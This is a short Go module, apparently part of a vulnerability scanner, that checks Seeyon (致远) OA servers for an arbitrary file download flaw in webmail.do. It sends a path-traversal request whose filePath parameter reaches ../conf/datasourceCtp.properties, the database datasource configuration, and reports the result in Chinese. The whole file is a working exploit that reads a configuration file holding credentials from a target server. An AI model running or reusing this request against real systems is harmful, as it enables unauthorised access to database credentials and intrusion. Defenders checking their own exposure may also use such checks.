package A8_webmail_filedown

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/seeyon/webmail.do?method=doDownloadAtt&filename=conf.txt&filePath=../conf/datasourceCtp.properties"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-]	致远OA webmail.do任意文件下载漏洞不存在")
		return
	}

	if resp.StatusCode == 200 && strings.Contains(resp.String(), "workflow") {
		color.Green.Println("[+]	致远OA webmail.do任意文件下载漏洞存在 -> " + url)
	} else {
		color.Red.Println("[-]	致远OA webmail.do任意文件下载漏洞不存在")
	}
}
